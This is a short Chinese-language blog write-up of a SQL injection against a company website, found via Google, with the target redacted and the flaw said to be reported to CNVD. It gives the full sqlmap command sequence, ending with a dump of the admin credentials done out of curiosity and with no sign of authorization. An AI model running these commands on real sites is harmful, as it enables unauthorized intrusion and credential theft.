# 记某公司前台SQL注入漏洞

前言

本次实战来源于谷歌搜索引擎。漏洞已经上报CNVD，全程会打码。  

  

实战过程

1.打开网站的前台，此时页面是正常显示，在URL头中发现id值。

![](../Images/ab024175ce4e38db8ab120d4ee14e60f.png)

  

2.尝试加入单引号验证是否存在SQL注入漏洞。发现加入单引号后，页面发生了一些变化。

![](../Images/b0c9c82fab364bccf851207322123039.png)

  

3.直接使用我们的SQL注入神器-SqlMap扫描一波数据库。成功扫描出来数据库。

SqlMap：

python sqlmap.py -u "http://XXXX.com/about.php?id=1"--delay 2 --batch –dbs

![](../Images/5af69b969ca6df9ab6b3fee34aa6261b.png)

  

4.继续查看数据库XXX里面的所有表。

SqlMap：

python sqlmap.py -u "http://XXXX.com/about.php?id=1"--delay 2 --batch -D XXXX --tables

![](../Images/344ce06b8ed914bbf2a85e538be7a5f0.png)

  

5.查看到了所有的表名，好奇心唆使我查看XXX表里的内容😜

SqlMap：

python sqlmap.py -u "http://XXXX.com/about.php?id=1"--delay 2 --batch -D XXXX -T XXXX –colum

![](../Images/48f7ab59c043d949130c0af18b5c53aa.png)

  

6.都到这里了，必须查看里面到底有些啥。这里得到了网站管理员的账号密码😁  

SqlMap：

python sqlmap.py -u "http://XXXX.com/about.php?id=1"--delay 2 --batch -D XXXX -T XXXX -C admin\_name,admin\_pass --dump

![](../Images/5f52e58e09625d379ea0958fb20d266d.png)

  

上报CNVD漏洞平台，溜了溜了。
